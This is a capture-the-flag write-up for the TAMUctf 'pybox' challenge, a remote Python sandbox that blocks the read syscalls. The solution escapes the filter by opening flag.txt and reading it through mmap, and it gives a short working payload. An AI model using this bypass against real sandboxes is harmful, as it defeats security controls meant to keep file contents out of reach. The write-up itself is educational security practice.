# pybox

## Description

`nc -q1 challenges.tamuctf.com 7234`

We spun up a remote server to execute your python code!  For security reasons we disabled a few syscalls but you can do all the computation you'd like!

Note: The python process can't import libraries so you'll need to instruct the server ahead of time which libraries are required.  

(source is provided but not the binary)

## Solution

From the source, we can identify the list of blocked syscalls:

```rust
const BLOCKED_SYSCALLS: [i32; 3] = [0, 17, 19];
```

Reviewing [this list for syscall mappings](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit), we find that the blocked syscalls are read, pread64, and readv. So we're not reading things today.

Notice also, however, that open is not a blocked syscall. Neither is mmap; using these together, we can read a section by mapping it to an address space and then just reading the memory.

```
2
mmap
os
f = os.open("flag.txt", os.O_RDONLY)
print(mmap.mmap(f, 0, prot=mmap.PROT_READ)[:].decode('ascii'))
```

os.open gives us a file descriptor, mmap maps the file to a region in memory. Fun!
